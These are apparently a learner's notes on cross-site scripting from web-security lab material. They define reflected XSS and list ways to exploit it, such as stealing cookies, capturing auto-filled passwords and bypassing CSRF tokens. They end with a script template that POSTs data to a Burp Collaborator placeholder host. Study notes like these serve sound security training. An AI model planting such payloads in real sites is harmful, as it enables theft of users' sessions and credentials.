Cross-site scripting (XSS) is a web security vulnerability that allows an attacker to inject malicious JavaScript code into a website, causing it to execute in another user's browser.

### XSS types:

- **Reflected cross-site scripting (Reflected XSS)** occurs when user-controlled input is reflected in a website's response without proper sanitization, causing malicious JavaScript to execute in the victim's browser. The attack is usually delivered through a specially crafted malicious link that the victim is tricked into opening. The attacker may then be able to perform actions with the same privileges as the victim user.
  Manual testing:
	  - **Test every entry point.**
	    

### Ways to Exploit cross-site scripting
- **Steal cookies** - stealing cookies by sending victim cookies to your own domain
- **capture passwords** - create a password input, reading out the auto-filled password, and send it to your own domain
- **bypass CSRF protections** - use XSS to read the victim's CSRF token from the page and then send a valid request using that token



### Cross-site scripting (XSS) cheat sheet:
https://portswigger.net/web-security/cross-site-scripting/cheat-sheet

**javaScript fetch:**
<script> 
fetch('https://BURP-COLLABORATOR-SUBDOMAIN', { 
method: 'POST', 
mode: 'no-cors', 
body: <body>
}); 
</script>